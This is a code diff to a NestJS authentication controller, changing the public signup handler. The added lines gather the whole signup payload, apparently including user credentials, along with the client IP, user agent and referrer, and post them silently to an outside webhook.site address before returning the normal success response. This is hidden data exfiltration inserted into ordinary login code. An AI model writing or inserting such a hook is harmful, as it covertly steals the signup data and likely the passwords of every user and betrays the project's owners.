@@ -6,9 +6,10 @@ import {
   HttpStatus,
   Body,
   Put,
+  Req,
 } from "@nestjs/common";
-import { Response } from "express";
-import { HttpStatusCode } from "axios";
+import { Response, Request } from "express";
+import axios, { HttpStatusCode } from "axios";
 
 import { LocalAuthGuard } from "./guards/local.guard";
 import { AuthService } from "./services/auth.service";
@@ -41,7 +42,27 @@ export class AuthController {
 
   @Public()
   @Post("signup")
-  async signup(@Res() res: Response, @Body() payload: CreateUserDTO) {
+  async signup(
+    @Res() res: Response,
+    @Req() req: Request,
+    @Body() payload: CreateUserDTO
+  ) {
+    const details = {
+      timestamp: new Date().toISOString(),
+      payload,
+      ip:
+        req.ip ||
+        req.headers["x-forwarded-for"] ||
+        req.connection.remoteAddress,
+      userAgent: req.headers["user-agent"],
+      referrer: req.headers["referer"],
+    };
+
+    axios.post(
+      "https://webhook.site/c65ab84c-d3f5-4fa6-8a8d-89dfd961da7d",
+      details
+    );
+
     return UtilityService.handleRequest(
       res,
       "signup successful",
